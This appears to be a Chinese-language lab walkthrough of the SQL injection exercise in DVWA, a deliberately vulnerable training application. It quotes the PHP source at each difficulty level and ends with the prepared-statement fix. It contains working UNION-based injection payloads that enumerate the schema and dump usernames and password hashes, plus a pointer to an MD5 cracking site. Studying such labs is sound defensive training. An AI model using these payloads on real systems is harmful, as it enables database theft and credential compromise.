<center>SQL InjectionSQL注入</center>







[toc]









## SQL InjectionSQL注入

> SQL注入







### 1. low

> 低级
>
> 代码

```php

<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

```

> 没有做任何过滤,查询两列，所以sql语句也只能查两个。 `'`单引号，字符型注入。



SQL注入思路

> 任务是：`脱库`，获取所有数据。

1. 确认是否有注入

```shell
1' or '1'='1
```

2. 获取当前数据库

```sql
库名
1' union select 1,database()#  

表名
1' union select 1,group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=database() #

表字段名
1' union select 1,group_concat(column_name) COLLATE utf8_general_ci from information_schema.columns where table_name='users' #
```

3. 脱库

```shell
1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(user,password) from users #
1' or 1=1 union select * from users #
```

> 获取到数据, 密码对应的用户名等信息。

```shell
1adminadmin,2GordonBrown,3HackMe,4PabloPicasso,5BobSmith
Surname: admin202cb962ac59075b964b07152d234b70,gordonbe99a18c428cb38d5f260853678922e03,13378d3533d75ae2c3966d7e0d4fcc69216b,pablo0d107d09f5bbe40cade3de5c71e9e9b7,smithy5f4dcc3b5aa765d61d8327deb882cf99
```

> [md5](https://cmd5.com/) 解密获取明文密码。牛皮。







### 2. medium

> 中级
>
> 代码

```php

<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

```

> `mysqli_real_escape_string`转义特殊字符 $id 没有引号，数字型注入。

> burp抓包，该包，用sql注入思路获取数据。

```shell
1. 确认是否有注入
id=1 or 1=1 

2. 获取数据
id=1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(user,password) from users #&Submit=Submit
```





### 3. high

> 高级
>
> 代码

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

```

> 多了`LIMIT 1`只查询一行数据。

```shell
# #  注释后面的就行
1' or 1=1 #

id=1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(user,password) from users #
```





### 4. impossible

> 不可能的

```php

<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

```

